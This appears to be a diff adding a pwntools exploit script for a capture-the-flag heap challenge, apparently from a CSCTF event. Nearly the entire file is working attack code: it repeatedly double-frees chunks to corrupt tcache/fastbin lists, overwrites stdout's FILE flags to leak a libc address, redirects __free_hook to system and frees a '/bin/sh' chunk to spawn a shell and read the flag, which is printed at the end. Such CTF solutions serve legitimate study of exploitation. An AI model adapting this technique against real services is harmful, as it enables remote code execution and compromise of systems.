@@ -1,0 +1,131 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+import signal
+def handle(signum, frame):
+    import os
+    print("killall gdb...")
+    # os.system("killall gdb")
+    exit()
+signal.signal(signal.SIGINT, handle)
+exe = ELF("./challe")
+libc = ELF("./libc-2.31.so")
+ld = ELF("./ld-2.31.so")
+# context.log_level='debug'
+context.terminal = ["foot"]
+# def exploit():
+while True:
+    try:
+        p = remote("shop.challs.csc.tf", 1337)
+        # p = process([exe.path])
+        def gdbs():
+            gdb.attach(p, gdbscript="""
+            # bb 0000000000001545
+            bb 00000000000015E3
+
+                       """)
+            # p = gdb.debug([exe.path],"""
+            #
+            #                 """)
+
+        sla = lambda msg, data: p.sendlineafter(msg, data)
+        sa = lambda msg, data: p.sendafter(msg, data)
+        sl = lambda data: p.sendline(data)
+        s = lambda data: p.send(data)
+        def add(size):
+            sla(">","1")
+            sla("?",str(size))
+        def dels(idx):
+            sla(">","3")
+            sla(":",str(idx))
+        def edit(idx,content):
+            sla(">","2")
+            sla(":",str(idx))
+            sa("ame:",content)
+
+        # gdbs()
+
+        add(0x500)
+        for i in range(11):
+            add(0x60)
+        for i in range(7):
+            dels(i+1)
+        dels(8)
+        dels(9)
+        dels(8)
+        for i in range(7):
+            add(0x60)
+        add(0x60)
+        # gdbs()
+        add(0x60)
+        edit(9,p64(0))
+        add(0x60)
+        add(0x60)
+        for i in range(7):
+            dels(i+1)
+        dels(9)
+        dels(10)
+        dels(9)
+        dels(11)
+        for i in range(7):
+            add(0x60)
+        dels(0)
+        add(0x70)
+        add(0x60)
+        edit(13,p16(0xb340))
+        edit(0,p16(0xd690))
+        add(0x60)
+        add(0x60)
+        add(0x60)
+        _IO_MAGIC = 0xfbad0000
+        _IO_IS_APPENDING = 0x1000
+        _IO_CURRENTLY_PUTTING = 0x800
+        # flag = p64(_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING) 
+        #
+        # fake = FileStructure(0)
+        # fake.flags = flag
+        # fake._IO_write_base = 0x3434343
+        # gdbs()
+        payload = p64(0)*2+p64(_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING) + p64(0) * 3 + b'\x00'
+        edit(14,payload)
+        p.recvuntil("\x00"*8)
+        addr = u64(p.recv(6).ljust(8,b"\x00"))
+        log.info(f"addr {hex(addr)}")
+        libc.address = addr - 0x1ec980
+        log.info(f"baselibc: {hex(libc.address)}")
+        for i in range(7):
+            dels(i+1)
+        dels(8)
+        dels(13)
+        dels(8)
+        dels(9)
+        for i in range(7):
+            add(0x60)
+        add(0x60)
+        edit(10,p64(libc.address+0x1eee48 )) # free hook
+        add(0x60)
+        add(0x60)
+        add(0x60)
+        libcsystem = libc.address+0x0000000000052290 # libc system
+        edit(15,p64(libcsystem))
+        # edit(15,b"fdsakfdjs")
+        add(0x60)
+        edit(16,"/bin/sh\x00")
+        dels(16)
+        sl("echo lmaodark")
+        try:
+            p.recvuntil("lmaodark")
+            sl("cat flag")
+            break
+        except:
+            p.close()
+    # except KeyboardInterrupt:
+    #     break
+    except:
+        pass
+#CSCTF{26f8aa2b094cc646137e7da9778584d1}
+p.interactive()
+
+# good luck pwning :)
+
